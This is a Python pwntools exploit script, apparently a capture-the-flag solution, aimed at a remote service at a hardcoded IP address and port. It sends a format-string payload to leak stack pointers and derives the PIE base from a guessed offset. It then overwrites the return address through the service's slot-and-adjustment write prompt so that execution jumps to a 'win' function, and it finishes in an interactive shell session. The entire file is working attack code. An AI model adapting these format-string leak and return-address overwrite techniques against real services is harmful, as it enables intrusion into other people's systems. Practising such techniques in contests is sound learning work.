#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
HOST = "52.59.124.14"
PORT = 5030

# Constants
# Relative offsets within code segment
# Expected pattern for return address leak is code address
LEAK_OFFSET_GUESS = 0xdc052 
WIN_OFFSET = 0xdbed0

def exploit():
    try:
        io = remote(HOST, PORT)
        
        # 1. Leak range 70-90 to find RET
        io.recvuntil(b'Name:\n')
        
        # Construct payload
        start_idx = 70
        end_idx = 90
        payload = "|".join([f"%{i}$p" for i in range(start_idx, end_idx)])
        io.sendline(payload.encode())
        
        io.recvuntil(b"market:\n")
        leak_line = io.recvline().decode().strip()
        print(f"Received leaks: {leak_line}")
        
        parts = leak_line.split('|')
        
        ret_index = -1
        leak_addr = 0
        
        for i, part in enumerate(parts):
            if part == '(nil)' or not part.startswith('0x'):
                continue
            val = int(part, 16)
            # Check if it looks like code pointer (0x55... or 0x56...)
            # And potentially ends in 052 (alignment might vary 16 bytes?)
            # 0xdc052 & 0xfff = 0x052.
            # We look for something closer to the expected offset
            if (val & 0xfff) == (LEAK_OFFSET_GUESS & 0xfff):
                # Found candidate?
                ret_index = start_idx + i
                leak_addr = val
                print(f"Found candidate RET at index {ret_index}: {hex(val)}")
                break
        
        if ret_index == -1:
            print("Could not find Return Address candidate")
            # Fallback to checking any 0x5... pointer
            for i, part in enumerate(parts):
                if part == '(nil)': continue
                val = int(part, 16)
                if val > 0x500000000000 and val < 0x600000000000:
                    print(f"Fallback: using index {start_idx+i}: {hex(val)}")
                    ret_index = start_idx + i
                    leak_addr = val
                    break
            if ret_index == -1:
                return

        # Calculate PIE
        # Assuming leak is indeed 0xdc052 offset
        # Only use last 12 bits to confirm? 
        # Actually just use LEAK_OFFSET_GUESS
        pie_base = leak_addr - LEAK_OFFSET_GUESS
        win_addr = pie_base + WIN_OFFSET
        print(f"PIE Base: {hex(pie_base)}")
        print(f"WIN: {hex(win_addr)}")
        
        # Calculate Scribe Offset
        # RET_ADDR = Arg[RET_INDEX]
        # Ledger = Arg[10] + 160 (actually Arg10 is start of buffer)
        # Offset = (RET_INDEX - 10) * 8 - 160
        # Check: If RET_INDEX=79 -> (69)*8 - 160 = 552 - 160 = 392. Correct.
        
        offset = (ret_index - 10) * 8 - 160
        print(f"Calculated Scribe Offset: {offset}")
        
        if offset < 0:
            print("Offset negative? Something wrong.")
            return

        slot = offset // 16
        adj = offset % 16
        size = 8
        
        print(f"Slot: {slot}, Adj: {adj}")
        
        io.recvuntil(b'slot index 0..128):\n')
        io.sendline(str(slot).encode())
        
        io.recvuntil(b'adjustment inside the slot (0..15):\n')
        io.sendline(str(adj).encode())
        
        io.recvuntil(b'How many bytes of ink? (max 8):\n')
        io.sendline(str(size).encode())
        
        io.recvuntil(b'Ink (raw bytes):\n')
        io.send(p64(win_addr))
        
        print("Payload sent. Interactive mode...")
        io.interactive()
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    exploit()
